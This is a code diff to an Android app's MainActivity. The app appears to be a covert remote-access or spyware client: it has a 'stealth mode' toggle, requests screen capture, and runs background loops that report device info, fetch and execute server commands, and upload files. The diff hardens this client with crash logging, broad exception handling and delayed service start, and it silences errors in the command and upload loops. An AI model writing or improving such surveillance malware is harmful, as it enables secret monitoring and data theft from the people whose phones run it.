@@ -10,10 +10,13 @@ import android.media.projection.MediaProjectionManager
 import android.net.ConnectivityManager
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.provider.Settings
 import android.widget.Button
 import android.widget.TextView
 import android.widget.Toast
+import java.io.File
 
 class MainActivity : Activity() {
 
@@ -30,35 +33,70 @@ class MainActivity : Activity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        setContentView(R.layout.activity_main)
 
-        statusText = findViewById(R.id.status_text)
-        connectionText = findViewById(R.id.connection_text)
-        screenCaptureButton = findViewById(R.id.screen_capture_button)
-        stealthButton = findViewById(R.id.stealth_button)
-
-        requestAppPermissions()
-        startBackgroundServices()
-        updateConnectionStatus()
-
-        screenCaptureButton.setOnClickListener {
-            requestScreenCapturePermission()
-        }
-
-        stealthButton.setOnClickListener {
-            toggleStealthMode()
-        }
-
-        Thread {
-            while (true) {
-                try {
-                    runOnUiThread { updateConnectionStatus() }
-                } catch (e: Exception) {
-                    e.printStackTrace()
-                }
-                Thread.sleep(5000)
+        val crashFile = File(getExternalFilesDir(null), "crash_log.txt")
+        val defaultHandler = Thread.getDefaultUncaughtExceptionHandler()
+        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
+            try {
+                crashFile.writeText(throwable.toString() + "\n" + throwable.stackTraceToString())
+            } catch (e: Exception) {
             }
-        }.start()
+            defaultHandler?.uncaughtException(thread, throwable)
+        }
+
+        try {
+            setContentView(R.layout.activity_main)
+
+            statusText = findViewById(R.id.status_text)
+            connectionText = findViewById(R.id.connection_text)
+            screenCaptureButton = findViewById(R.id.screen_capture_button)
+            stealthButton = findViewById(R.id.stealth_button)
+
+            if (crashFile.exists()) {
+                val lastCrash = crashFile.readText().take(300)
+                statusText.text = lastCrash
+            }
+
+            screenCaptureButton.setOnClickListener {
+                try {
+                    requestScreenCapturePermission()
+                } catch (e: Exception) {
+                    statusText.text = "Button error: " + e.message
+                }
+            }
+
+            stealthButton.setOnClickListener {
+                try {
+                    toggleStealthMode()
+                } catch (e: Exception) {
+                    statusText.text = "Button error: " + e.message
+                }
+            }
+
+            try {
+                requestAppPermissions()
+            } catch (e: Exception) {
+                statusText.text = "Permission error: " + e.message
+            }
+
+            Handler(Looper.getMainLooper()).postDelayed({
+                try {
+                    updateConnectionStatus()
+                    startBackgroundServices()
+                } catch (e: Exception) {
+                    statusText.text = "Background error: " + e.message
+                }
+            }, 3000)
+
+        } catch (e: Exception) {
+            try {
+                val errorView = TextView(this)
+                errorView.text = "START ERROR: " + e.toString()
+                errorView.setPadding(40, 40, 40, 40)
+                setContentView(errorView)
+            } catch (e2: Exception) {
+            }
+        }
     }
 
     private fun requestAppPermissions() {
@@ -105,7 +143,6 @@ class MainActivity : Activity() {
                 try {
                     apiService.sendUserStatus(deviceId, deviceInfo)
                 } catch (e: Exception) {
-                    e.printStackTrace()
                 }
                 Thread.sleep(30000)
             }
@@ -116,7 +153,6 @@ class MainActivity : Activity() {
                 try {
                     apiService.fetchAndHandleCommands(deviceId)
                 } catch (e: Exception) {
-                    e.printStackTrace()
                 }
                 Thread.sleep(1000)
             }
@@ -127,9 +163,18 @@ class MainActivity : Activity() {
                 try {
                     apiService.uploadPendingFiles()
                 } catch (e: Exception) {
-                    e.printStackTrace()
                 }
                 Thread.sleep(10000)
+            }
+        }.start()
+
+        Thread {
+            while (true) {
+                try {
+                    runOnUiThread { updateConnectionStatus() }
+                } catch (e: Exception) {
+                }
+                Thread.sleep(5000)
             }
         }.start()
     }
